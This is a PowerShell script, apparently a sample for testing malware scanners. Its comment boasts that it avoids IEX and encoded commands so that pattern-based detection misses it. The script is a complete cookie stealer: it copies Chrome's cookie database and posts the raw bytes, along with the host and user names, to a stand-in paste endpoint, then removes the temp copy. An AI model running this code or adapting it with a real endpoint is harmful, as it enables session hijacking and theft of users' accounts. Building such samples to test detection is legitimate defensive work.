# Stealthy: no IEX, no -EncodedCommand, no obfuscation. Just normal cmdlets,
# but the *behavior* is malicious: it staticly exfils browser cookies to a
# pastebin-style endpoint. A pattern-based scanner that looks for IEX or
# DownloadString will miss this entirely.

$dest = 'https://paste.example.invalid/api/upload'
$cookieDb = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data\Default\Network\Cookies'

if (Test-Path $cookieDb) {
    $tmp = New-TemporaryFile
    Copy-Item -Path $cookieDb -Destination $tmp.FullName -Force
    $body = Get-Content -Path $tmp.FullName -Raw -Encoding Byte
    $hdrs = @{
        'X-Host'     = $env:COMPUTERNAME
        'X-User'     = $env:USERNAME
        'Content-Type' = 'application/octet-stream'
    }
    Invoke-RestMethod -Uri $dest -Method Post -Body $body -Headers $hdrs
    Remove-Item -Path $tmp.FullName -Force
}
